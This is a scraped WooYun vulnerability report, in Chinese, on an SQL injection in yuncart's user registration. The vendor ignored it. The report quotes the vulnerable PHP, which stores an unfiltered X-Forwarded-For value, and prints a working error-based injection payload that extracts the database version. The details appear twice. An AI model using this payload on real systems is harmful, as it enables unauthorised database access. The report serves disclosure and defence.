{"id": 54593, "wybug_id": "wooyun-2014-063919", "wybug_title": "yuncart sql注入 1", "wybug_corp": "yuncart", "wybug_author": "zcy", "wybug_date": "2014-06-09 12:31", "wybug_open_date": "2014-09-07 12:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-09：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-09-07：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： yuncart sql注入 详细说明：  漏洞文件位于\\include\\front\\user.class.php第70行-第128行\n/**\t *  \t * 保存注册用户\t *\t *\t **/\tpublic function doreg() {\t\t//接收条件\t\t$uname\t\t= trim($_POST[\"uname\"]);\t\t$pass\t\t= $_POST[\"pass\"];\t\t$pass2\t\t= $_POST[\"pass2\"];\t\t$email\t\t= trim($_POST[\"email\"]);\t\t$referer\t= empty($_SERVER[\"HTTP_REFERER\"])?url('index','index'):$_SERVER['HTTP_REFERER'];\t\t\t\t//判断验证码\t\t$seccode\t = strtolower(trim($_POST[\"seccode\"]));\t\t$sess_verify = '';\t\tif(isset($_SESSION['verify'])) {\t\t\t$sess_verify\t= strtolower($_SESSION['verify']);\t\t\t//销毁verify\t\t\tunset($_SESSION['verify']);\t\t}\t\tif( !$seccode || ($sess_verify != $seccode)  ) {\t\t\t$this->setHint(\"wrong_seccode\",\"error\",url(\"index\",\"user\",'reg'));\t\t}\t\t\t\t//判断用户\t\tif(DB::getDB()->selectexist(\"user\",\"uname='\".$uname.\"'\")) {\t\t\t$this->setHint(\"uname_exist\",\"error\",url(\"index\",\"user\",'reg'));\t\t}\t\t//密码\t\t$len = strlen($pass);\t\tif($len<4 || $len >20) {\t\t\t$this->setHint(\"pass_length_error\",\"error\",\turl(\"index\",\"user\",'reg'));\t\t}\t\tif($pass != $pass2) {\t\t\t$this->setHint(\"pass_not_equal\",\"error\",url(\"index\",\"user\",'reg'));\t\t}\t\tif(!$email || !isemail($email)) {\t\t\t$this->setHint(\"email_error\",\"error\",url(\"index\",\"user\",'reg'));\t\t}\t\t\t\t//入库\t\t$data = array(\"uname\"=>$uname,\"email\"=>$email);\t\t$data += encpass($pass);\t\t$data[\"regip\"]\t= getClientIp();->获取客户端ip\t\t$data[\"lasttime\"] = $data[\"regtime\"]= time();\t\t$uid = DB::getDB()->insert(\"user\",$data);\t\tunset($pass,$data);\t\t\t\t//session;\t\t$_SESSION[\"uname\"] = $uname;\t\t$_SESSION[\"uid\"]   = $uid;\t\t\t\tredirect($refer);\t}\ngetClientIp()在\\include\\common\\global_function.php中\n/** * * 获取客户端IP *  */function getClientIp(){\tif (getenv(\"HTTP_CLIENT_IP\") && strcasecmp(getenv(\"HTTP_CLIENT_IP\"), \"unknown\"))\t\t$ip = getenv(\"HTTP_CLIENT_IP\");\telse if (getenv(\"HTTP_X_FORWARDED_FOR\") && strcasecmp(getenv(\"HTTP_X_FORWARDED_FOR\"), \"unknown\"))\t\t$ip = getenv(\"HTTP_X_FORWARDED_FOR\");\telse if (getenv(\"REMOTE_ADDR\") && strcasecmp(getenv(\"REMOTE_ADDR\"), \"unknown\"))\t\t$ip = getenv(\"REMOTE_ADDR\");\telse if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], \"unknown\"))\t\t$ip = $_SERVER['REMOTE_ADDR'];\telse\t\t$ip = \"unknown\";\treturn $ip;}\n获取ip的时候没有任何过过滤，导致了Insert型注入使用Firefox插件修改x-forwarded-for\n' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,version(),0x27,0x7e) )) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1\n然后注册用户访问\n\n然后确认提交爆出数据库版本信息\n\n   漏洞证明：  漏洞文件位于\\include\\front\\user.class.php第70行-第128行\n/**\t *  \t * 保存注册用户\t *\t *\t **/\tpublic function doreg() {\t\t//接收条件\t\t$uname\t\t= trim($_POST[\"uname\"]);\t\t$pass\t\t= $_POST[\"pass\"];\t\t$pass2\t\t= $_POST[\"pass2\"];\t\t$email\t\t= trim($_POST[\"email\"]);\t\t$referer\t= empty($_SERVER[\"HTTP_REFERER\"])?url('index','index'):$_SERVER['HTTP_REFERER'];\t\t\t\t//判断验证码\t\t$seccode\t = strtolower(trim($_POST[\"seccode\"]));\t\t$sess_verify = '';\t\tif(isset($_SESSION['verify'])) {\t\t\t$sess_verify\t= strtolower($_SESSION['verify']);\t\t\t//销毁verify\t\t\tunset($_SESSION['verify']);\t\t}\t\tif( !$seccode || ($sess_verify != $seccode)  ) {\t\t\t$this->setHint(\"wrong_seccode\",\"error\",url(\"index\",\"user\",'reg'));\t\t}\t\t\t\t//判断用户\t\tif(DB::getDB()->selectexist(\"user\",\"uname='\".$uname.\"'\")) {\t\t\t$this->setHint(\"uname_exist\",\"error\",url(\"index\",\"user\",'reg'));\t\t}\t\t//密码\t\t$len = strlen($pass);\t\tif($len<4 || $len >20) {\t\t\t$this->setHint(\"pass_length_error\",\"error\",\turl(\"index\",\"user\",'reg'));\t\t}\t\tif($pass != $pass2) {\t\t\t$this->setHint(\"pass_not_equal\",\"error\",url(\"index\",\"user\",'reg'));\t\t}\t\tif(!$email || !isemail($email)) {\t\t\t$this->setHint(\"email_error\",\"error\",url(\"index\",\"user\",'reg'));\t\t}\t\t\t\t//入库\t\t$data = array(\"uname\"=>$uname,\"email\"=>$email);\t\t$data += encpass($pass);\t\t$data[\"regip\"]\t= getClientIp();->获取客户端ip\t\t$data[\"lasttime\"] = $data[\"regtime\"]= time();\t\t$uid = DB::getDB()->insert(\"user\",$data);\t\tunset($pass,$data);\t\t\t\t//session;\t\t$_SESSION[\"uname\"] = $uname;\t\t$_SESSION[\"uid\"]   = $uid;\t\t\t\tredirect($refer);\t}\ngetClientIp()在\\include\\common\\global_function.php中\n/** * * 获取客户端IP *  */function getClientIp(){\tif (getenv(\"HTTP_CLIENT_IP\") && strcasecmp(getenv(\"HTTP_CLIENT_IP\"), \"unknown\"))\t\t$ip = getenv(\"HTTP_CLIENT_IP\");\telse if (getenv(\"HTTP_X_FORWARDED_FOR\") && strcasecmp(getenv(\"HTTP_X_FORWARDED_FOR\"), \"unknown\"))\t\t$ip = getenv(\"HTTP_X_FORWARDED_FOR\");\telse if (getenv(\"REMOTE_ADDR\") && strcasecmp(getenv(\"REMOTE_ADDR\"), \"unknown\"))\t\t$ip = getenv(\"REMOTE_ADDR\");\telse if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], \"unknown\"))\t\t$ip = $_SERVER['REMOTE_ADDR'];\telse\t\t$ip = \"unknown\";\treturn $ip;}\n获取ip的时候没有任何过过滤，导致了Insert型注入使用Firefox插件修改x-forwarded-for\n' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,version(),0x27,0x7e) )) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1\n然后注册用户访问\n\n然后确认提交爆出数据库版本信息\n\n   修复方案：  过滤ip   版权声明：转载请注明来源 zcy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}